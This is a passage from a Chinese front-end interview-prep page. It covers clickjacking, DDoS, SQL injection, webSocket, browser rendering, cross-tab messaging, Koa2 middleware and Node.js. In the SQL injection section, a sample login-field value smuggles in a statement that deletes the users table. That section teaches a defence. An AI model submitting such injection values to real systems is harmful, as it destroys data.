</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>增加 http header <code>X-Frame-Options:SAMEORIGIN</code> ，让 <code>&lt;iframe&gt;</code> 只能加载同域名的网页。</p> <p>PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。</p> <h3 id="ddos"><a href="#ddos" class="header-anchor">#</a> DDoS</h3> <p>Distributed denial-of-service 分布式拒绝服务</p> <p>通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br>
类似于恶意堵车，妨碍正常车辆通行。</p> <p>网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br>
由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。</p> <p>DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如<a href="https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL" target="_blank" rel="noopener noreferrer">阿里云 WAF<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。</p> <p>PS：阮一峰的网站就曾遭遇过 DDoS 攻击 https://www.ruanyifeng.com/blog/2018/06/ddos.html</p> <h3 id="sql-注入"><a href="#sql-注入" class="header-anchor">#</a> SQL 注入</h3> <p>普通的登录方式，输入用户名 <code>zhangsan</code> 、密码 <code>123</code> ，然后服务端去数据库查询。<br>
会执行一个 sql 语句 <code>select * from users where username='zhangsan' and password='123'</code> ，然后判断是否找到该用户。</p> <p>如果用户输入的是用户名 <code>' delete from users where 1=1; --</code> ，密码 <code>'123'</code><br>
那生成的 sql 语句就是 <code>select * from users where username='' delete from users where 1=1; --' and password='123'</code><br>
这样就会把 <code>users</code> 数据表全部删除。</p> <p>防止 SQL 注入：服务端进行特殊字符转换，如把 <code>'</code> 转换为 <code>\'</code></p> <h3 id="答案-5"><a href="#答案-5" class="header-anchor">#</a> 答案</h3> <ul><li>XSS</li> <li>CSRF</li> <li>点击劫持</li> <li>DDoS</li> <li>SQL 注入</li></ul> <h2 id="websocket"><a href="#websocket" class="header-anchor">#</a> webSocket</h2> <h3 id="题目-8"><a href="#题目-8" class="header-anchor">#</a> 题目</h3> <p>webSocket 和 http 协议有何区别？有和应用场景？</p> <h3 id="websocket-简介"><a href="#websocket-简介" class="header-anchor">#</a> webSocket 简介</h3> <p>webSocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。<br>
代码参考 ws-server 中 webSocket1.html webSocket2.html</p> <p>场景：消息通知，直播讨论区，聊天室，协同编辑</p> <h3 id="websocket-建立连接"><a href="#websocket-建立连接" class="header-anchor">#</a> webSocket 建立连接</h3> <p>会先发起一个 http 请求，根服务端建立连接。连接成功之后再升级为 webSocket 协议，然后再通讯。</p> <p><img src="/assets/img/wsconect.331a5dfa.png" alt=""></p> <h3 id="websocket-和-http-区别"><a href="#websocket-和-http-区别" class="header-anchor">#</a> webSocket 和 http 区别</h3> <ul><li>协议名称不同 <code>ws</code> 和 <code>http</code></li> <li>http 一般只能浏览器发起请求，webSocket 可以双端发起请求</li> <li>webSocket 无跨域限制</li> <li>webSocket 通过 <code>send</code> 和 <code>onmessage</code> 进行通讯，http 通过 <code>req</code> 和 <code>res</code> 通讯</li></ul> <p>PS：<code>ws</code> 可以升级为 <code>wss</code> 协议，像 <code>http</code> 升级到 <code>https</code> 一样，增加 <code>SSL</code> 安全协议。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> createServer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'https'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> readFileSync <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'fs'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> WebSocketServer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ws'</span>

<span class="token keyword">const</span> server <span class="token operator">=</span> <span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token literal-property property">cert</span><span class="token operator">:</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/path/to/cert.pem'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/path/to/key.pem'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> wss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> server <span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="扩展"><a href="#扩展" class="header-anchor">#</a> 扩展</h3> <p>PS：如果做项目开发，推荐使用 <a href="https://www.npmjs.com/package/socket.io" target="_blank" rel="noopener noreferrer">socket.io<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，API 更方便。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>io<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token parameter">socket</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// emit an event to the socket</span>
  socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token comment">/* … */</span><span class="token punctuation">)</span>
  <span class="token comment">// emit an event to all connected sockets</span>
  io<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'broadcast'</span><span class="token punctuation">,</span> <span class="token comment">/* … */</span><span class="token punctuation">)</span>
  <span class="token comment">// listen to the event</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'reply'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">/* … */</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="连环问-websocket-和长轮询-长连接-的区别"><a href="#连环问-websocket-和长轮询-长连接-的区别" class="header-anchor">#</a> 连环问：webSocket 和长轮询（长连接）的区别</h3> <ul><li>http 长轮询 - 客户端发起 http 请求，server 不立即返回，等待有结果再返回。这期间 TCP 连接不会关闭，阻塞式。（需要处理 timeout 的情况）</li> <li>webSocket - 客户端发起请求，服务端接收，连接关闭。服务端发起请求，客户端接收，连接关闭。非阻塞。</li></ul> <p><img src="/assets/img/lunxun.69486292.png" alt=""></p> <h2 id="输入-url-到页面展示"><a href="#输入-url-到页面展示" class="header-anchor">#</a> 输入 url 到页面展示</h2> <h3 id="题目-9"><a href="#题目-9" class="header-anchor">#</a> 题目</h3> <p>从输入 url 到显示页面的完整过程</p> <h3 id="特别注意"><a href="#特别注意" class="header-anchor">#</a> 特别注意</h3> <p>现在浏览器经过多年发展和优化，加载和渲染机制已经非常复杂，我们只能讲解基本的流程。不可较真细节。</p> <h3 id="步骤"><a href="#步骤" class="header-anchor">#</a> 步骤</h3> <ul><li>网络请求</li> <li>解析</li> <li>渲染页面</li></ul> <h3 id="网络请求"><a href="#网络请求" class="header-anchor">#</a> 网络请求</h3> <ul><li>DNS 解析，根据域名获得 IP 地址</li> <li>建立 TCP 连接 “三次握手”</li> <li>发送 http 请求</li> <li>接收请求响应，获得网页 html 代码</li></ul> <p>获取了 html 之后，解析过程中还可能会继续加载其他资源：js css 图片等。<br>
静态资源可能会有强缓存，加载时要判断。</p> <p><img src="/assets/img/cache-control.664cb370.png" alt=""></p> <h3 id="解析"><a href="#解析" class="header-anchor">#</a> 解析</h3> <blockquote><p>html css 等源代码是字符串形式，需要解析为特定的数据结构，才能被后续使用。</p></blockquote> <p>过程</p> <ul><li>html 构建 DOM 树</li> <li>css 构建 CSSOM（即 style tree）</li> <li>两者结合形成 Render tree （包括尺寸、定位等）</li></ul> <p><img src="/assets/img/render.85a66640.png" alt=""></p> <p>css 包括：</p> <ul><li>内嵌 css <code>&lt;style&gt;</code></li> <li>外链 css <code>&lt;link&gt;</code></li></ul> <p>解析到 <code>&lt;script&gt;</code> 加载，并有可能修改 DOM 树和 render tree 。</p> <ul><li>内嵌 js</li> <li>外链 js</li></ul> <p>PS：加载和执行 <code>&lt;script&gt;</code> 的情况比较多，如有 <code>defer</code> <code>async</code> 属性，就不一样。</p> <p>解析到 <code>&lt;img&gt;</code> 等媒体文件，也要并行加载。加载完成后再渲染页面。</p> <p>综上，为了避免不必要的情况，要遵守以下规则</p> <ul><li>css 尽量放在 <code>&lt;head&gt;</code> 中，不要异步加载 css</li> <li>js 尽量放在 <code>&lt;body&gt;</code> 最后，不要中途加载、执行 js</li> <li><code>&lt;img&gt;</code> 等媒体文件尽量限制尺寸，防止渲染时重绘页面</li></ul> <h3 id="渲染页面"><a href="#渲染页面" class="header-anchor">#</a> 渲染页面</h3> <p>通过 render tree 绘制页面。</p> <p>绘制完成之后，还要继续执行异步加载的资源</p> <ul><li>异步的 css ，重新渲染页面</li> <li>异步的 js ，执行（可能重新渲染页面）</li> <li>异步加载的图片等，可能重新渲染页面（根据图片尺寸）</li></ul> <p>最后页面渲染完成。</p> <h3 id="答案-6"><a href="#答案-6" class="header-anchor">#</a> 答案</h3> <ul><li>网络请求
<ul><li>DNS 解析</li> <li>TCP 连接</li> <li>HTTP 请求和响应</li></ul></li> <li>解析
<ul><li>DOM 树</li> <li>render tree</li></ul></li> <li>渲染页面
<ul><li>可能重绘页面</li></ul></li></ul> <h3 id="连环问-什么是重绘-repaint-和重排-reflow-有何区别"><a href="#连环问-什么是重绘-repaint-和重排-reflow-有何区别" class="header-anchor">#</a> 连环问：什么是重绘 repaint 和重排 reflow ，有何区别</h3> <p>页面渲染完成之后，随着异步加载和用户的操作，会随时发生 repaint 或者 reflow 。例如</p> <ul><li>各种网页动画</li> <li>modal dialog 弹框</li> <li>页面元素的新增、删除和隐藏</li></ul> <p>结论：重排的影响更大</p> <ul><li>重绘 repaint ：某些元素的外观被改变，但尺寸和定位不变，例如：元素的背景色改变。</li> <li>重排 reflow ：重新生成布局，重新排列元素。如一个元素高度变化，导致所有元素都下移。</li></ul> <p>重绘不一定重排，但重排一定会导致重绘。<br>
所以，要尽量避免重排。</p> <ul><li>集中修改样式，或直接使用 <code>class</code></li> <li>DOM 操作前先使用 <code>display: none</code> 脱离文档流</li> <li>使用 BFC ，不影响外部的元素</li> <li>对于频繁触发的操作（<code>resize</code> <code>scroll</code> 等）使用节流和防抖</li> <li>使用 <code>createDocumentFragment</code> 进行批量 DOM 操作</li> <li>优化动画，如使用 <code>requestAnimationFrame</code> 或者 CSS3（可启用 GPU 加速）</li></ul> <h3 id="连环问-触发-css-bfc-的条件"><a href="#连环问-触发-css-bfc-的条件" class="header-anchor">#</a> 连环问：触发 css BFC 的条件</h3> <p>BFC - Block Formatting Context 块格式化上下文</p> <ul><li>根节点 html</li> <li>设置 float <code>left</code> <code>right</code></li> <li>设置 overflow <code>auto</code> <code>scroll</code> <code>hidden</code></li> <li>设置 display <code>inline-block</code> <code>table</code> <code>table-cell</code> <code>flex</code> <code>grid</code></li> <li>设置 position <code>absolute</code> <code>fixed</code></li></ul> <h2 id="网页多标签页之间的通讯"><a href="#网页多标签页之间的通讯" class="header-anchor">#</a> 网页多标签页之间的通讯</h2> <h3 id="题目-10"><a href="#题目-10" class="header-anchor">#</a> 题目</h3> <p>网络多标签之间如何通讯？<br>
例如打开两个 chrome 标签，一个访问列表页，一个访问详情页。在详情页修改了标题，列表页也要同步过来。</p> <h3 id="websocket-2"><a href="#websocket-2" class="header-anchor">#</a> webSocket</h3> <p>通过 webSocket 多页面通讯，无跨域限制。</p> <h3 id="localstorage"><a href="#localstorage" class="header-anchor">#</a> localStorage</h3> <p>同域的两个页面，可以通过 localStorage 通讯。A 页面可以监听到 B 页面的数据变化。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// list 页面</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'storage'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>key<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'newValue'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>newValue<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// detail 页面</span>
localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'changeInfo'</span><span class="token punctuation">,</span> <span class="token string">'xxx'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="sharedworker"><a href="#sharedworker" class="header-anchor">#</a> SharedWorker</h3> <p>Javascript 是单线程的，而且和页面渲染线程互斥。所以，一些计算量大的操作会影响页面渲染。<br></p> <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API/Using_web_workers" target="_blank" rel="noopener noreferrer">WebWorker<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 可以 <code>new Worker('xxx.js')</code> 用来进行 JS 计算，并通过 <code>postMessage</code> 和 <code>onmessage</code> 和网页通讯。<br>
但这个 worker 是当前页面专有的，不得多个页面、iframe 共享。</p> <p>PS：WebWorker 专用于 JS 计算，不支持 DOM 操作。</p> <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/SharedWorker" target="_blank" rel="noopener noreferrer">SharedWorker<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 可以被同域的多个页面共享使用，也可以用于通讯。<br>
源码参考 msg-sharedWork-list.html 和 msg-sharedWork-detail.html 。注意，worker 中的日志需要 <code>chrome://inspect</code> 中打开控制台查看。</p> <p>PS：注意浏览器兼容性，不支持 IE11</p> <h3 id="答案-7"><a href="#答案-7" class="header-anchor">#</a> 答案</h3> <ul><li>webSocket 需要服务端参与，但不限制跨域</li> <li>localStorage 简单易用</li> <li>SharedWorker 本地调试不太方便，考虑浏览器兼容性</li></ul> <h3 id="连环问-iframe-通讯"><a href="#连环问-iframe-通讯" class="header-anchor">#</a> 连环问：iframe 通讯</h3> <p>除了上述几个方法，iframe 通讯最常用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage" target="_blank" rel="noopener noreferrer">window.postMessage<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> ，支持跨域。</p> <p>通过 <code>window.postMessage</code> 发送消息。注意第二个参数，可以限制域名，如发送敏感信息，要限制域名。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 父页面向 iframe 发送消息</span>
window<span class="token punctuation">.</span>iframe1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>

<span class="token comment">// iframe 向父页面发送消息</span>
window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>可监听 <code>message</code> 来接收消息。可使用 <code>event.origin</code> 来判断信息来源是否合法，可选择不接受。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'origin'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span> <span class="token comment">// 通过 origin 判断是否来源合法</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'child received'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="koa2-洋葱圈模型"><a href="#koa2-洋葱圈模型" class="header-anchor">#</a> koa2 洋葱圈模型</h2> <h3 id="题目-11"><a href="#题目-11" class="header-anchor">#</a> 题目</h3> <p>请描述 Koa2 的洋葱圈模型</p> <h3 id="解释"><a href="#解释" class="header-anchor">#</a> 解释</h3> <p>代码参考 Koa2 官网</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> Koa <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'koa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Koa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// logger</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> rt <span class="token operator">=</span> ctx<span class="token punctuation">.</span>response<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'X-Response-Time'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ctx<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ctx<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>rt<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// x-response-time</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> start <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> ms <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">;</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'X-Response-Time'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ms<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">ms</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// response</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token parameter">ctx</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token string">'Hello World'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h3 id="图示"><a href="#图示" class="header-anchor">#</a> 图示</h3> <p><img src="/assets/img/koa2.03fed780.png" alt=""></p> <p><img src="/assets/img/koa2yang.ad641f06.png" alt=""></p> <h2 id="为何需要-nodejs"><a href="#为何需要-nodejs" class="header-anchor">#</a> 为何需要 nodejs</h2> <p>注：文本小节</p> <h3 id="题目-12"><a href="#题目-12" class="header-anchor">#</a> 题目</h3> <p>当 Java PHP Python 等服务端语言和技术都完备的情况下，为何还需要 nodejs 做服务端呢？</p> <h3 id="对比其他语言"><a href="#对比其他语言" class="header-anchor">#</a> 对比其他语言</h3> <p>当年 Java 被发明使用时， C C++ 也发展了几十年了，为何 Java 还照样发展壮大起来呢？</p> <p>以及近几年、现在，仍有多种新的语言被发明和使用，例如 swift golang Dart 等。</p> <p>所以，nodejs 被使用不是个例，而是历史、现在、未来都发生的事情，它仅仅是其中的一件。</p> <h3 id="技术的核心价值-提升效率"><a href="#技术的核心价值-提升效率" class="header-anchor">#</a> 技术的核心价值 —— 提升效率</h3> <p>如果你去做一个年终总结或者晋升述职，你对你的领导说：<br>
“我今年用了一个 xx 技术，非常厉害。最先进的技术，github stars 多少多少，国内外个大公司都在用，基于它来开发非常爽...”</p> <p>说完，你的领导心里会有一个大大的问号：然后呢？这个技术给我降低了多少成本？带来了多少收益？—— 技术是生产力，技术的厉害最终都会体现到生产效率。<br>
让领导带着这个疑问，那你的年终奖或者晋升估计悬了。</p> <p>现在你换一种说法：<br>
“我今年用了一个 xx 技术，非常厉害。这一年我们的项目工期降低了 xx ，项目 bug 率降低了 xx ，核算项目成本降低了 xx ，效率增加了 xx ...”<br>
然后把这个技术的优势展示一下，再展示一些统计数据。</p> <p>说完，领导一看就觉得心里踏实了。</p> <p>PS：不仅仅是软件技术，这个世界上任何技术、产品、制度流程、组织关系的存在，都是在优化效率。乃至全社会的经济发展，说白了就是生产效率。</p> <h3 id="nodejs-如何提升效率"><a href="#nodejs-如何提升效率" class="header-anchor">#</a> nodejs 如何提升效率</h3> <p>网上说的 nodejs 的好处，大概都是：单线程，基于事件驱动，非阻塞，适合高并发服务。<br>
这些都是技术优势，就跟上文的第一个述职一样，没有体现任何生产效率的价值。</p> <p>有同学可能会问：“适合高并发服务” 这不就是生产效率吗？—— 这是一个好问题<br>
但是，我们看问题得综合起来看。例如，你告诉 Java 工程师 nodejs 的好处，他们会用吗？—— 不会的，因为学习和切换技术栈需要大量的成本。</p> <p>所以，nodejs 的关键在于它用了 JS 语法，而社会上有大量的熟悉 JS 的前端工程师。</p> <ul><li>JS 语言不用学习，只需要了解 nodejs API 即可</li> <li>前端工程师不做服务端，没有切换技术栈的历史包袱</li></ul> <p>而前端工程师如果想要做服务端、做 webpack 等工具，nodejs 显然是他们最适合的技术方案，效率最高的方案。<br>
如果让他们再去学习 Java 等其他语言，这又是一大成本。</p> <h3 id="前端工程师需要自己做服务端吗"><a href="#前端工程师需要自己做服务端吗" class="header-anchor">#</a> 前端工程师需要自己做服务端吗？</h3> <p>如果是一个公司级别的系统，庞大的项目，前端、客户端、服务端指责划分明确，只不需要前端工程师来开发服务端的。</p> <p>但有些职能部门，需要开发一些企业内部的管理工具，或者一些小型的系统。此时再去找服务端的人，会遇到很多沟通障碍，特别是某些大公司，还有很多其他非技术的因素阻碍沟通。所以，预期困难的沟通还不如自己搞一个，反正也不会很复杂（相对于企业级的大系统后端来说）。</p> <p>而且，自己开发了服务端，就可以争取到更多的资源和工作机会。领导很希望这样，因为这样可以扩大自己的退伍，有利于领导未来的晋升。</p> <p>综合来看，在这些情况下，前端人员用 nodejs 自研服务端，是不是效率最高的方式呢？—— 答案很明显。</p> <h3 id="总结"><a href="#总结" class="header-anchor">#</a> 总结</h3> <p>nodejs 有一定的技术优势，但它真正的优势在于使用 JS 语法，前端工程师学习成本低，能提高研发效率。</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">8/5/2022, 9:18:58 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/algorithm/分析解决问题.html" class="prev">
        分析解决问题
      </a></span> <span class="next"><a href="/algorithm/知识深度-原理和源码.html">
        知识深度-原理和源码
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><!----><canvas id="vuepress-canvas-cursor"></canvas><div class="kanbanniang" data-v-5775ee02><div class="banniang-container" style="display:;" data-v-5775ee02><div class="messageBox" style="right:68px;bottom:190px;display:none;" data-v-5775ee02>
      欢迎来到 张晓伟-技术文档
